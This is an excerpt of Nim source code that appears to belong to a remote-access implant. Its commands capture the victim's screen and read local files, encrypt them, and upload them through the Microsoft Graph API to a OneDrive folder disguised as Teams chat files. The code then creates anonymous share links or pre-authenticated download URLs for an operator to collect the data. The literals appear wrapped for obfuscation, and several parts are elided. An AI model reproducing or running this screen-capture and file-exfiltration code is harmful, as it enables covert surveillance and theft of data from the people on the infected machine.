...
proc captureScreenPng*(): seq[byte] =
  ## Capture the primary screen using BitBlt and encode as PNG bytes.
  ...
  # Extract raw BGRA pixels via GetDIBits
  var bmi: BITMAPINFO
  ...
  discard GetDIBits(dc2, bmp, 0, UINT(h), addr pixels[0], addr bmi, DIB_RGB_COLORS)
  ReleaseDC(0, dc2)
  DeleteObject(bmp)
  # Encode as BMP (simple, no external library needed)
  ...
  bmpData[2] = byte(fs and 0xFF); bmpData[3] = byte((fs shr 8) and 0xFF)
  bmpData[4] = byte((fs shr 16) and 0xFF); bmpData[5] = byte((fs shr 24) and 0xFF)
...
proc cmdScreenshot*(tokens: var TokenDict): string =
  let bmpData = captureScreenPng()
  if bmpData.len == 0:
    return "[ERR] Screenshot capture failed"

  let ts       = now().format("yyyyMMdd'_'HHmmss")
  let filename = "screenshot_" & ts & ".bmp"

  if tokens.graphToken.len == 0:
    let b64 = encode(bmpData)
    return s("[SCREENSHOT_B64 ") & filename & " " & b64 & "]"

  # Encrypt before upload
  let encrypted = encryptFile(bmpData)

  let encodedName = encodeUrl(filename)
  let putUrl = (
    s("https://graph.microsoft.com/v1.0/me/drive/root:") &
    s("/Microsoft%20Teams%20Chat%20Files/") & encodedName &
    s(":/content?@microsoft.graph.conflictBehavior=rename&select=*,sharepointIds")
  )
  let uploadHeaders = @[
  ...
  var meta: JsonNode
  try:
    let rPut = apiCall(s("PUT"), putUrl, tokens, uploadHeaders,
                       cast[string](encrypted))
  ...
  # Build shareId
  let itemId  = meta.getOrDefault(s("id")).getStr()
  var shareId = ""
  try:
    let rLink = apiCall(s("POST"),
      s("https://graph.microsoft.com/v1.0/me/drive/items/") & itemId & s("/createLink"),
      tokens, graphHeaders(tokens),
      $(%*{s("type"): s("view"), s("scope"): s("anonymous")}))
    if rLink.code in [200, 201]:
      let linkBody = parseJson(rLink.body)
      let linkObj  = if linkBody.hasKey(s("link")): linkBody[s("link")] else: newJObject()
      let webUrl   = linkObj.getOrDefault(s("webUrl")).getStr()
      if webUrl.len > 0:
        shareId = s("u!") & encode(webUrl, safe = true).strip(chars = {'='})
  except: discard
  if shareId.len == 0:
    let b64 = encode(bmpData)
    return s("[SCREENSHOT_B64 ") & filename & " " & b64 & "]"

  s("[SCREENSHOT_URL ") & filename & " " & shareId & "]"


#################################################################

const INLINE_THRESHOLD = 15 * 1024
...
proc uploadPartToOneDrive(partData: seq[byte]; partName: string;
  ...
  # Request @microsoft.graph.downloadUrl in the select clause so OneDrive
  # includes the pre-authenticated direct download URL in the response.
  let putUrl = (
    s("https://graph.microsoft.com/v1.0/me/drive/root:") &
    s("/Microsoft%20Teams%20Chat%20Files/") & encodedName &
  ...
  var meta: JsonNode
  try:
    let rPut = apiCall(s("PUT"), putUrl, tokens,
                       commonHeaders & @[(s("Content-Type"), mimeType)],
                       cast[string](partData))
    if rPut.code in [200, 201]:
      meta = parseJson(rPut.body)
  except: discard
  if meta == nil: return ""

  # Extract the direct pre-auth download URL from the PUT response.
  # This URL is valid for ~1 hour and requires no additional auth headers.
  let dlUrl = meta.getOrDefault(s("@microsoft.graph.downloadUrl")).getStr()
  return dlUrl   # empty string if not present
...
proc cmdDownload*(path: string; tokens: var TokenDict; threadId: string): string =
  ...
  let encrypted = encryptFile(rawData)   # AES-256-GCM: nonce(12) + ciphertext + tag(16)
  let totalSize = encrypted.len
  let ts        = now().format("yyyyMMdd'_'HHmmss")   # timestamp for unique part names
